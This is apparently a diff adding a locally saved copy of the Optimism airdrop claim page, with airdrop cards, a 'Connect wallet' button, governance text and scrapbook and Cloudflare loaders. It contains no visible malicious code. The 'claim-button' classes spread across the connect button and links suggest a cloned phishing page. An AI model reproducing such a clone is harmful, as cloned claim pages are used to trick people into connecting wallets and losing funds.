class="_container_mefg7_1"><div class="_container_mefg7_1"><button data-cy="connectWallet" class="claim-button _connectButton_4o8oh_6">Connect wallet<claim-button><div class="_focus_mefg7_32"></div></button></div></div></div><div class="_contentSection_1mjhw_45"><div class="_columnOne_1mjhw_71"><div class="_airdropCardsContainer_281l9_1"><a class="_cardLink_281l9_9" href="https://app.optimism.io/airdrops/4"></a><div class="_card_281l9_9"><a class="_cardLink_281l9_9" href="https://app.optimism.io/airdrops/4"><img class="_cardImage_281l9_34" src="images/airdrop_4_banner-17c1c52f.png" alt="OP Logo"></a><div class="_cardHeader_281l9_40"><a class="_cardLink_281l9_9" href="https://app.optimism.io/airdrops/4"><div class="_headerText_281l9_45"><h1>Airdrop 4: Superchain Creators</h1><div class="_statusSection_281l9_61"><div class="_claimIcon_281l9_106 _container_gq79w_1 _small_gq79w_16"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="circle" class="svg-inline--fa fa-circle fa-fw " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 512A256 256 0 1 0 256 0a256 256 0 1 0 0 512z"></path></svg></div><h5>Claim by Feb 13, 2025</h5></div></div></a><div class="_activeHeaderAction_281l9_67"><a class="_cardLink_281l9_9" href="https://app.optimism.io/airdrops/4"><div class="_criteriaText_281l9_74">2 eligibility criteria</div></a><div class="claim-button _container_mefg7_1"><a class="claim-button _cardLink_281l9_9" href="https://app.optimism.io/airdrops/4"></a><div class="claim-button _container_mefg7_1"><a class="claim-button _cardLink_281l9_9" href="https://app.optimism.io/airdrops/4"></a><button class="_viewButton_281l9_82 _wrapper_mefg7_6 _secondary_mefg7_122 _medium_mefg7_81"><a class="claim-button _cardLink_281l9_9" href="https://app.optimism.io/airdrops/4"></a><div class="claim-button _innerButtonContainer_mefg7_46"><a class="claim-button _cardLink_281l9_9" href="https://app.optimism.io/airdrops/4"></a><a class="claim-button _viewButtonText_281l9_82" href="https://community.optimism.io/docs/governance/airdrop-4/">View</a></div><div class="_focus_mefg7_32"></div></button></div></div></div></div><div class="_description_281l9_149"><fbt desc="Small description for airdrop">A great society needs artists. This airdrop is a thank you to the artists and their ability to bring creativity onchain. Your contributions play a vital role in the Optimism Collective.</fbt></div><div class="_cardFooter_281l9_88"><img src="images/op-logo-fdad73bd.webp" alt="OP Logo"><span style="color: var(--op-text-default);"><span style="font-weight: bold; color: var(--op-text-default);">10.3M OP</span> to <span style="font-weight: bold; color: var(--op-text-default);">22.9K addresses</span></span></div></div><a href="https://community.optimism.io/docs/governance/airdrop-3/" class="_cardLink_281l9_9" target="_blank" rel="noreferrer"></a><div class="_card_281l9_9"><a href="https://community.optimism.io/docs/governance/airdrop-3/" class="_cardLink_281l9_9" target="_blank" rel="noreferrer"></a><div class="_cardHeader_281l9_40"><a href="https://community.optimism.io/docs/governance/airdrop-3/" class="_cardLink_281l9_9" target="_blank" rel="noreferrer"><div class="_headerText_281l9_45"><h1>Airdrop 3</h1><h5>Sep 17, 2023</h5></div></a><div class="_container_mefg7_1"><a href="https://community.optimism.io/docs/governance/airdrop-3/" class="_cardLink_281l9_9" target="_blank" rel="noreferrer"></a><div class="_container_mefg7_1"><a href="https://community.optimism.io/docs/governance/airdrop-3/" class="_cardLink_281l9_9" target="_blank" rel="noreferrer"></a><button class="_viewButton_281l9_82 _wrapper_mefg7_6 _secondary_mefg7_122 _medium_mefg7_81"><a href="https://community.optimism.io/docs/governance/airdrop-3/" class="_cardLink_281l9_9" target="_blank" rel="noreferrer"></a><div class="_innerButtonContainer_mefg7_46"><a href="https://community.optimism.io/docs/governance/airdrop-3/" class="_cardLink_281l9_9" target="_blank" rel="noreferrer"></a><a href="https://community.optimism.io/docs/governance/airdrop-3/" class="_viewButtonText_281l9_82" target="_blank" rel="noreferrer">View</a></div><div class="_focus_mefg7_32"></div></button></div></div></div><div class="_cardFooter_281l9_88"><img src="images/oplogo-gray-ab57f402.svg" alt="OP Logo"><span><span style="font-weight: bold;">19.4M OP</span> to <span style="font-weight: bold;">31.9K addresses</span></span></div></div><a href="https://community.optimism.io/docs/governance/airdrop-2/" class="_cardLink_281l9_9" target="_blank" rel="noreferrer"></a><div class="_card_281l9_9"><a href="https://community.optimism.io/docs/governance/airdrop-2/" class="_cardLink_281l9_9" target="_blank" rel="noreferrer"></a><div class="_cardHeader_281l9_40"><a href="https://community.optimism.io/docs/governance/airdrop-2/" class="_cardLink_281l9_9" target="_blank" rel="noreferrer"><div class="_headerText_281l9_45"><h1>Airdrop 2</h1><h5>Feb 8, 2023</h5></div></a><div class="_container_mefg7_1"><a href="https://community.optimism.io/docs/governance/airdrop-2/" class="_cardLink_281l9_9" target="_blank" rel="noreferrer"></a><div class="_container_mefg7_1"><a href="https://community.optimism.io/docs/governance/airdrop-2/" class="_cardLink_281l9_9" target="_blank" rel="noreferrer"></a><button class="_viewButton_281l9_82 _wrapper_mefg7_6 _secondary_mefg7_122 _medium_mefg7_81"><a href="https://community.optimism.io/docs/governance/airdrop-2/" class="_cardLink_281l9_9" target="_blank" rel="noreferrer"></a><div class="_innerButtonContainer_mefg7_46"><a href="https://community.optimism.io/docs/governance/airdrop-2/" class="_cardLink_281l9_9" target="_blank" rel="noreferrer"></a><a href="https://community.optimism.io/docs/governance/airdrop-2/" class="_viewButtonText_281l9_82" target="_blank" rel="noreferrer">View</a></div><div class="_focus_mefg7_32"></div></button></div></div></div><div class="_cardFooter_281l9_88"><img src="images/oplogo-gray-ab57f402.svg" alt="OP Logo"><span><span style="font-weight: bold;">11.7M OP</span> to <span style="font-weight: bold;">308.0K addresses</span></span></div></div><a href="https://community.optimism.io/docs/governance/airdrop-1/" class="_cardLink_281l9_9" target="_blank" rel="noreferrer"></a><div class="_card_281l9_9"><a href="https://community.optimism.io/docs/governance/airdrop-1/" class="_cardLink_281l9_9" target="_blank" rel="noreferrer"></a><div class="_cardHeader_281l9_40"><a href="https://community.optimism.io/docs/governance/airdrop-1/" class="_cardLink_281l9_9" target="_blank" rel="noreferrer"><div class="_headerText_281l9_45"><h1>Airdrop 1</h1><h5>May 31, 2022</h5></div></a><div class="_container_mefg7_1"><a href="https://community.optimism.io/docs/governance/airdrop-1/" class="_cardLink_281l9_9" target="_blank" rel="noreferrer"></a><div class="_container_mefg7_1"><a href="https://community.optimism.io/docs/governance/airdrop-1/" class="_cardLink_281l9_9" target="_blank" rel="noreferrer"></a><button class="_viewButton_281l9_82 _wrapper_mefg7_6 _secondary_mefg7_122 _medium_mefg7_81"><a href="https://community.optimism.io/docs/governance/airdrop-1/" class="_cardLink_281l9_9" target="_blank" rel="noreferrer"></a><div class="_innerButtonContainer_mefg7_46"><a href="https://community.optimism.io/docs/governance/airdrop-1/" class="_cardLink_281l9_9" target="_blank" rel="noreferrer"></a><a href="https://community.optimism.io/docs/governance/airdrop-1/" class="_viewButtonText_281l9_82" target="_blank" rel="noreferrer">View</a></div><div class="_focus_mefg7_32"></div></button></div></div></div><div class="_cardFooter_281l9_88"><img src="images/oplogo-gray-ab57f402.svg" alt="OP Logo"><span><span style="font-weight: bold;">200.1M OP</span> to <span style="font-weight: bold;">248.7K addresses</span></span></div></div></div><div class="_aboutSection_1mjhw_50"><h2><fbt desc="About airdrops">About airdrops</fbt></h2><fbt desc="Airdrop content"><p>Optimism has committed to giving 19% of the total initial token supply to the community through airdrops. Approximately 13.03% remains for future airdrops. <a class="_container_kd3bw_1 _medium_kd3bw_39 _default_kd3bw_15 _default_kd3bw_15 _inline_kd3bw_57" href="https://community.optimism.io/docs/governance/allocations/#user-airdrops" target="_blank" rel="noreferrer">Learn more</a></p></fbt><fbt desc="Airdrop content"><p>Airdrops target constructive participation—ensuring that tokens go to contributors. Past airdrop eligibility criteria does not guarantee eligibility in future airdrops.</p></fbt></div><div class="_aboutSection_1mjhw_50"><h2><fbt desc="About governance">About governance</fbt></h2><fbt desc="Governance content"><p>The Optimism Collective is governed by two houses: the Token House and Citizens' House. Together, they enable Optimism’s collaborative ecosystem to grow and flourish.</p></fbt><fbt desc="Governance content"><p>In order to claim tokens via airdrop, you must delegate your tokens for participation in governance. You retain 100% ownership of your tokens, but your delegate wields their voting power. Select and make changes to your delegate at <a class="_container_kd3bw_1 _medium_kd3bw_39 _default_kd3bw_15 _default_kd3bw_15 _inline_kd3bw_57" href="https://vote.optimism.io/delegates" target="_blank" rel="noreferrer">vote.optimism.io</a></p></fbt><fbt desc="Governance content"><p>Interested in governance? <a class="_container_kd3bw_1 _medium_kd3bw_39 _default_kd3bw_15 _default_kd3bw_15 _inline_kd3bw_57" href="https://community.optimism.io/docs/governance/" target="_blank" rel="noreferrer">Learn more</a></p></fbt></div></div><div class="_governanceCardContainer_5jpcu_1"><a href="https://vote.optimism.io/delegates" target="_blank" rel="noreferrer" class="_cardLink_5jpcu_8"></a><div class="_delegationCard_5jpcu_14"><a href="https://vote.optimism.io/delegates" target="_blank" rel="noreferrer" class="_cardLink_5jpcu_8"><h4>OP is a governance token</h4><span>You retain 100% ownership of your tokens, but your delegate wields their voting power.</span><img alt="Delegates" src="images/delegates-combined-6ee4574e.svg"></a><div class="_agoraLink_5jpcu_34"><a href="https://vote.optimism.io/delegates" target="_blank" rel="noreferrer" class="_cardLink_5jpcu_8"></a><a class="_agoraLink_5jpcu_34 _container_kd3bw_1 _small_kd3bw_32 _default_kd3bw_15 _default_kd3bw_15 _inline_kd3bw_57" href="https://vote.optimism.io/delegates" target="_blank" rel="noreferrer">View on Agora</a><div class="_arrowIcon_5jpcu_39 _container_gq79w_1 _xsmall_gq79w_8"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="arrow-up-right" class="svg-inline--fa fa-arrow-up-right fa-fw " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512"><path fill="currentColor" d="M352 128c0-17.7-14.3-32-32-32L96 96c-17.7 0-32 14.3-32 32s14.3 32 32 32l146.7 0L41.4 361.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0L288 205.3 288 352c0 17.7 14.3 32 32 32s32-14.3 32-32l0-224z"></path></svg></div></div></div><div class="_allocationCard_5jpcu_48"><img src="images/sunny-55a31cb5.svg" alt="Sunny Face"><h3> 255,901,955 OP</h3><span>Airdropped to Optimism Collective contributors</span></div></div></div></div></div></div></div><div class="footer__outerContainer"><div class="footer__container"><div class="footer__icons row"><a class="discord" href="https://discord.gg/optimism" target="_blank" rel="noreferrer" data-testid="footer-discord"><svg aria-hidden="true" focusable="false" data-prefix="fab" data-icon="discord" class="svg-inline--fa fa-discord " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><path fill="currentColor" d="M524.531,69.836a1.5,1.5,0,0,0-.764-.7A485.065,485.065,0,0,0,404.081,32.03a1.816,1.816,0,0,0-1.923.91,337.461,337.461,0,0,0-14.9,30.6,447.848,447.848,0,0,0-134.426,0,309.541,309.541,0,0,0-15.135-30.6,1.89,1.89,0,0,0-1.924-.91A483.689,483.689,0,0,0,116.085,69.137a1.712,1.712,0,0,0-.788.676C39.068,183.651,18.186,294.69,28.43,404.354a2.016,2.016,0,0,0,.765,1.375A487.666,487.666,0,0,0,176.02,479.918a1.9,1.9,0,0,0,2.063-.676A348.2,348.2,0,0,0,208.12,430.4a1.86,1.86,0,0,0-1.019-2.588,321.173,321.173,0,0,1-45.868-21.853,1.885,1.885,0,0,1-.185-3.126c3.082-2.309,6.166-4.711,9.109-7.137a1.819,1.819,0,0,1,1.9-.256c96.229,43.917,200.41,43.917,295.5,0a1.812,1.812,0,0,1,1.924.233c2.944,2.426,6.027,4.851,9.132,7.16a1.884,1.884,0,0,1-.162,3.126,301.407,301.407,0,0,1-45.89,21.83,1.875,1.875,0,0,0-1,2.611,391.055,391.055,0,0,0,30.014,48.815,1.864,1.864,0,0,0,2.063.7A486.048,486.048,0,0,0,610.7,405.729a1.882,1.882,0,0,0,.765-1.352C623.729,277.594,590.933,167.465,524.531,69.836ZM222.491,337.58c-28.972,0-52.844-26.587-52.844-59.239S193.056,219.1,222.491,219.1c29.665,0,53.306,26.82,52.843,59.239C275.334,310.993,251.924,337.58,222.491,337.58Zm195.38,0c-28.971,0-52.843-26.587-52.843-59.239S388.437,219.1,417.871,219.1c29.667,0,53.307,26.82,52.844,59.239C470.715,310.993,447.538,337.58,417.871,337.58Z"></path></svg></a><a class="twitter" href="https://twitter.com/optimism" target="_blank" rel="noreferrer" data-testid="footer-twitter"><svg aria-hidden="true" focusable="false" data-prefix="fab" data-icon="twitter" class="svg-inline--fa fa-twitter " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"></path></svg></a><a class="mirror" href="https://optimism.mirror.xyz/" target="_blank" rel="noreferrer" data-testid="footer-mirror"><svg width="12" height="16" viewBox="0 0 12 16" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M11.9688 6.5C11.9688 3.1875 9.28125 0.5 5.96875 0.5C2.65625 0.5 0 3.1875 0 6.5V15C0 15.2761 0.223858 15.5 0.5 15.5H11.4983C11.7751 15.5 11.9992 15.2751 11.9983 14.9983L11.9688 6.5Z" fill="currentColor"></path></svg></a><a class="github" href="https://github.com/ethereum-optimism/" target="_blank" rel="noreferrer" data-testid="footer-github"><svg aria-hidden="true" focusable="false" data-prefix="fab" data-icon="github" class="svg-inline--fa fa-github " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"></path></svg></a></div><div class="footer__labels row"><a href="https://help.optimism.io/" target="_blank" rel="noreferrer" data-testid="link-help-center">Help center</a><a href="https://optimism.canny.io/bug-reports" target="_blank" rel="noreferrer" data-testid="link-report-bug">Report a bug</a></div></div></div><div class="Toastify"></div></div></div>
+    
+    <!--
+      This HTML file is a template.
+      If you open it directly in the browser, you will see an empty page.
+
+      You can add webfonts, meta tags, or analytics to this file.
+      The build step will place the bundled scripts into the <body> tag.
+
+      To begin the development, run `npm start` or `pnpm start`.
+      To create a production bundle, use `npm run build` or `pnpm build`.
+    -->
+  
+  <link href="css/css.css" rel="stylesheet" type="text/css">
+  
+  
+
+<wcm-modal data-scrapbook-shadowdom="<!----><wcm-explorer-context data-scrapbook-shadowdom=" <!----="">"&gt;<wcm-theme-context data-scrapbook-shadowdom="<!---->"></wcm-theme-context><div id="wcm-modal" role="alertdialog" aria-modal="true" class=" wcm-overlay "><div class="wcm-container" tabindex="0"><!--?lit$490276378$--></div></div><style data-scrapbook-elem="adoptedStyleSheet">*, ::after, ::before { margin: 0px; padding: 0px; box-sizing: border-box; font-style: normal; text-rendering: optimizespeed; -webkit-font-smoothing: antialiased; -webkit-tap-highlight-color: transparent; backface-visibility: hidden; }
+button { cursor: pointer; display: flex; justify-content: center; align-items: center; position: relative; border: none; background-color: transparent; transition: all 0.2s ease 0s; }
+@media (hover: hover) and (pointer: fine) {
+  button:active { transition: all 0.1s ease 0s; transform: scale(0.93); }
+}
+button::after { content: ""; position: absolute; inset: 0px; transition: background-color 0s ease 0s, all 0.2s ease 0s; }
+button:disabled { cursor: not-allowed; }
+button svg, button wcm-text { position: relative; z-index: 1; }
+input { border: none; outline: 0px; appearance: none; }
+img { display: block; }
+::selection { color: var(--wcm-accent-fill-color); background: var(--wcm-accent-color); }</style><style data-scrapbook-elem="adoptedStyleSheet">:host { all: initial; }
+.wcm-overlay { inset: 0px; position: fixed; z-index: var(--wcm-z-index); overflow: hidden; display: flex; justify-content: center; align-items: center; opacity: 0; pointer-events: none; background-color: var(--wcm-overlay-background-color); backdrop-filter: var(--wcm-overlay-backdrop-filter); }
+@media (max-height: 720px) and (orientation: landscape) {
+  .wcm-overlay { overflow: scroll; align-items: flex-start; padding: 20px 0px; }
+}
+.wcm-active { pointer-events: auto; }
+.wcm-container { position: relative; max-width: 360px; width: 100%; outline: 0px; border-radius: var(--wcm-background-border-radius) var(--wcm-background-border-radius) var(--wcm-container-border-radius) var(--wcm-container-border-radius); border: 1px solid var(--wcm-color-overlay); overflow: hidden; }
+.wcm-card { width: 100%; position: relative; border-radius: var(--wcm-container-border-radius); overflow: hidden; box-shadow: 0 6px 14px -6px rgba(10,16,31,.12),0 10px 32px -4px rgba(10,16,31,.1),0 0 0 1px var(--wcm-color-overlay); background-color: var(--wcm-color-bg-1); color: var(--wcm-color-fg-1); }
+@media (max-width: 600px) {
+  .wcm-container { max-width: 440px; border-radius: var(--wcm-background-border-radius) var(--wcm-background-border-radius) 0 0; }
+  .wcm-card { border-radius: var(--wcm-container-border-radius) var(--wcm-container-border-radius) 0 0; }
+  .wcm-overlay { align-items: flex-end; }
+}
+@media (max-width: 440px) {
+  .wcm-container { border: 0px; }
+}</style>"&gt;</wcm-modal><wcm-modal data-scrapbook-shadowdom="<!----><wcm-explorer-context data-scrapbook-shadowdom=" <!----="">"&gt;<wcm-theme-context data-scrapbook-shadowdom="<!---->"></wcm-theme-context><div id="wcm-modal" role="alertdialog" aria-modal="true" class=" wcm-overlay "><div class="wcm-container" tabindex="0"><!--?lit$490276378$--></div></div><style data-scrapbook-elem="adoptedStyleSheet">*, ::after, ::before { margin: 0px; padding: 0px; box-sizing: border-box; font-style: normal; text-rendering: optimizespeed; -webkit-font-smoothing: antialiased; -webkit-tap-highlight-color: transparent; backface-visibility: hidden; }
+button { cursor: pointer; display: flex; justify-content: center; align-items: center; position: relative; border: none; background-color: transparent; transition: all 0.2s ease 0s; }
+@media (hover: hover) and (pointer: fine) {
+  button:active { transition: all 0.1s ease 0s; transform: scale(0.93); }
+}
+button::after { content: ""; position: absolute; inset: 0px; transition: background-color 0s ease 0s, all 0.2s ease 0s; }
+button:disabled { cursor: not-allowed; }
+button svg, button wcm-text { position: relative; z-index: 1; }
+input { border: none; outline: 0px; appearance: none; }
+img { display: block; }
+::selection { color: var(--wcm-accent-fill-color); background: var(--wcm-accent-color); }</style><style data-scrapbook-elem="adoptedStyleSheet">:host { all: initial; }
+.wcm-overlay { inset: 0px; position: fixed; z-index: var(--wcm-z-index); overflow: hidden; display: flex; justify-content: center; align-items: center; opacity: 0; pointer-events: none; background-color: var(--wcm-overlay-background-color); backdrop-filter: var(--wcm-overlay-backdrop-filter); }
+@media (max-height: 720px) and (orientation: landscape) {
+  .wcm-overlay { overflow: scroll; align-items: flex-start; padding: 20px 0px; }
+}
+.wcm-active { pointer-events: auto; }
+.wcm-container { position: relative; max-width: 360px; width: 100%; outline: 0px; border-radius: var(--wcm-background-border-radius) var(--wcm-background-border-radius) var(--wcm-container-border-radius) var(--wcm-container-border-radius); border: 1px solid var(--wcm-color-overlay); overflow: hidden; }
+.wcm-card { width: 100%; position: relative; border-radius: var(--wcm-container-border-radius); overflow: hidden; box-shadow: 0 6px 14px -6px rgba(10,16,31,.12),0 10px 32px -4px rgba(10,16,31,.1),0 0 0 1px var(--wcm-color-overlay); background-color: var(--wcm-color-bg-1); color: var(--wcm-color-fg-1); }
+@media (max-width: 600px) {
+  .wcm-container { max-width: 440px; border-radius: var(--wcm-background-border-radius) var(--wcm-background-border-radius) 0 0; }
+  .wcm-card { border-radius: var(--wcm-container-border-radius) var(--wcm-container-border-radius) 0 0; }
+  .wcm-overlay { align-items: flex-end; }
+}
+@media (max-width: 440px) {
+  .wcm-container { border: 0px; }
+}</style>"&gt;</wcm-modal><wcm-modal data-scrapbook-shadowdom="<!----><wcm-explorer-context data-scrapbook-shadowdom=" <!----="">"&gt;<wcm-theme-context data-scrapbook-shadowdom="<!---->"></wcm-theme-context><div id="wcm-modal" role="alertdialog" aria-modal="true" class=" wcm-overlay "><div class="wcm-container" tabindex="0"><!--?lit$490276378$--></div></div><style data-scrapbook-elem="adoptedStyleSheet">*, ::after, ::before { margin: 0px; padding: 0px; box-sizing: border-box; font-style: normal; text-rendering: optimizespeed; -webkit-font-smoothing: antialiased; -webkit-tap-highlight-color: transparent; backface-visibility: hidden; }
+button { cursor: pointer; display: flex; justify-content: center; align-items: center; position: relative; border: none; background-color: transparent; transition: all 0.2s ease 0s; }
+@media (hover: hover) and (pointer: fine) {
+  button:active { transition: all 0.1s ease 0s; transform: scale(0.93); }
+}
+button::after { content: ""; position: absolute; inset: 0px; transition: background-color 0s ease 0s, all 0.2s ease 0s; }
+button:disabled { cursor: not-allowed; }
+button svg, button wcm-text { position: relative; z-index: 1; }
+input { border: none; outline: 0px; appearance: none; }
+img { display: block; }
+::selection { color: var(--wcm-accent-fill-color); background: var(--wcm-accent-color); }</style><style data-scrapbook-elem="adoptedStyleSheet">:host { all: initial; }
+.wcm-overlay { inset: 0px; position: fixed; z-index: var(--wcm-z-index); overflow: hidden; display: flex; justify-content: center; align-items: center; opacity: 0; pointer-events: none; background-color: var(--wcm-overlay-background-color); backdrop-filter: var(--wcm-overlay-backdrop-filter); }
+@media (max-height: 720px) and (orientation: landscape) {
+  .wcm-overlay { overflow: scroll; align-items: flex-start; padding: 20px 0px; }
+}
+.wcm-active { pointer-events: auto; }
+.wcm-container { position: relative; max-width: 360px; width: 100%; outline: 0px; border-radius: var(--wcm-background-border-radius) var(--wcm-background-border-radius) var(--wcm-container-border-radius) var(--wcm-container-border-radius); border: 1px solid var(--wcm-color-overlay); overflow: hidden; }
+.wcm-card { width: 100%; position: relative; border-radius: var(--wcm-container-border-radius); overflow: hidden; box-shadow: 0 6px 14px -6px rgba(10,16,31,.12),0 10px 32px -4px rgba(10,16,31,.1),0 0 0 1px var(--wcm-color-overlay); background-color: var(--wcm-color-bg-1); color: var(--wcm-color-fg-1); }
+@media (max-width: 600px) {
+  .wcm-container { max-width: 440px; border-radius: var(--wcm-background-border-radius) var(--wcm-background-border-radius) 0 0; }
+  .wcm-card { border-radius: var(--wcm-container-border-radius) var(--wcm-container-border-radius) 0 0; }
+  .wcm-overlay { align-items: flex-end; }
+}
+@media (max-width: 440px) {
+  .wcm-container { border: 0px; }
+}</style>"&gt;</wcm-modal><script data-scrapbook-elem="basic-loader" type="68153b38896eb69091c58280-text/javascript">(function () { var k1 = "data-scrapbook-shadowdom", k2 = "data-scrapbook-canvas", k3 = "data-scrapbook-input-indeterminate", k4 = "data-scrapbook-input-checked", k5 = "data-scrapbook-option-selected", k6 = "data-scrapbook-input-value", k7 = "data-scrapbook-textarea-value", fn = function (r) { var E = r.querySelectorAll ? r.querySelectorAll("*") : r.getElementsByTagName("*"), i = E.length, e, d, s; while (i--) { e = E[i]; if ((d = e.getAttribute(k1)) !== null && !e.shadowRoot && e.attachShadow) { s = e.attachShadow({mode: 'open'}); s.innerHTML = d; e.removeAttribute(k1); } if ((d = e.getAttribute(k2)) !== null) { (function () { var c = e, g = new Image(); g.onload = function () { c.getContext('2d').drawImage(g, 0, 0); }; g.src = d; })(); e.removeAttribute(k2); } if ((d = e.getAttribute(k3)) !== null) { e.indeterminate = true; e.removeAttribute(k3); } if ((d = e.getAttribute(k4)) !== null) { e.checked = d === 'true'; e.removeAttribute(k4); } if ((d = e.getAttribute(k5)) !== null) { e.selected = d === 'true'; e.removeAttribute(k5); } if ((d = e.getAttribute(k6)) !== null) { e.value = d; e.removeAttribute(k6); } if ((d = e.getAttribute(k7)) !== null) { e.value = d; e.removeAttribute(k7); } if (e.shadowRoot) { fn(e.shadowRoot); } } }; fn(document); })()</script><script src="js/rocket-loader.min.js" data-cf-settings="68153b38896eb69091c58280-|49" defer=""></script><script>(function(){var js = "window['__CF$cv$params']={r:'85d30db678c906d4',t:'MTcwOTIzMjIxMy42NDQwMDA='};_cpo=document.createElement('script');_cpo.nonce='',_cpo.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js',document.getElementsByTagName('head')[0].appendChild(_cpo);";var _0xh = document.createElement('iframe');_0xh.height = 1;_0xh.width = 1;_0xh.style.position = 'absolute';_0xh.style.top = 0;_0xh.style.left = 0;_0xh.style.border = 'none';_0xh.style.visibility = 'hidden';document.body.appendChild(_0xh);function handler() {var _0xi = _0xh.contentDocument || _0xh.contentWindow.document;if (_0xi) {var _0xj = _0xi.createElement('script');_0xj.innerHTML = js;_0xi.getElementsByTagName('head')[0].appendChild(_0xj);}}if (document.readyState !== 'loading') {handler();} else if (window.addEventListener) {document.addEventListener('DOMContentLoaded', handler);} else {var prev = document.onreadystatechange || function () {};document.onreadystatechange = function (e) {prev(e);if (document.readyState !== 'loading') {document.onreadystatechange = prev;handler();}};}})();</script><iframe height="1" width="1" style="position: absolute; top: 0px; left: 0px; border: none; visibility: hidden;"></iframe><style data-scrapbook-elem="adoptedStyleSheet">a[href^="https://bongacams2.com/track?"] { display: none !important; }
+div[class^="Adstyled__AdWrapper-"] { display: none !important; }
+a[href^="https://s.optzsrv.com/"] { display: none !important; }
+a[data-obtrack^="http://paid.outbrain.com/network/redir?"] { display: none !important; }
+a[href^="https://ngineet.cfd/"] { display: none !important; }
+a[href^="https://mediaserver.entainpartners.com/renderBanner.do?"] { display: none !important; }
+a[href^="https://land.brazzersnetwork.com/landing/"] { display: none !important; }
+a[href^="https://lijavaxa.com/"] { display: none !important; }
+[href^="https://zone.gotrackier.com/"] { display: none !important; }
+a[href^="https://go.xlviiirdr.com"] { display: none !important; }
+a[href^="https://bngprm.com/"] { display: none !important; }
+a[href^="//go.eabids.com/"] { display: none !important; }
+a[href^="https://lead1.pl/"] { display: none !important; }
+[href^="https://go.smljmp.com/"] { display: none !important; }
+a[href^="https://static.fleshlight.com/images/banners/"] { display: none !important; }
+div[style*="box-shadow: rgb(136, 136, 136) 0px 0px 12px; color: "] { display: none !important; }
+a[href^="https://get.surfshark.net/aff_c?"][href*="&aff_id="] > img { display: none !important; }
+[href*="speenphorbin.com"] { display: none !important; }
+a[href^="https://banners.livepartners.com/"] { display: none !important; }
+div[class^="native-ad-"] { display: none !important; }
+[data-lnguri^="https://s3.amazonaws.com"] { display: none !important; }
+ad-shield-ads { display: none !important; }
+div[id^="crt-"][style] { display: none !important; }
+div[class$="player-promo-col"] { display: none !important; }
+div[aria-label="Ads"] { display: none !important; }
+a[href^="https://traffdaq.com/"] { display: none !important; }
+[data-type="ad-vertical"] { display: none !important; }
+a[href*=".g2afse.com/"] { display: none !important; }
+[class^="s2nPlayer"] { display: none !important; }
+a[href^="https://porntubemate.com/"] { display: none !important; }
+a[href^="https://1betandgonow.com/"] { display: none !important; }
+a[href^="https://go.strpjmp.com/"] { display: none !important; }
+[href^="https://ilovemyfreedoms.com/landing-"] { display: none !important; }
+a[data-href^="http://ads.trafficjunky.net/"] { display: none !important; }
+a[href^="https://m.do.co/c/"] > img { display: none !important; }
